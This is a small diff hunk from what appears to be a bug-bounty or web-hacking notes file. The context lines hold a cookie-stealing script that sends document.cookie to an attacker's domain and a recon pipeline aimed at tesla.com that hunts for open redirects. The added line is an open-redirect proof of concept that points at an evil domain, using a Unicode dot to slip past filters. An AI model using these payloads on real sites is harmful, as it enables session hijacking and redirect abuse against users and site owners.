@@ -283,7 +283,7 @@ else{
     var cookie = document.cookie; 
 document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
 echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew    >>> to get open url redirect 
-
+poc: redirect_to=////evil%E3%80%82com
 
 
 ...................................................................................
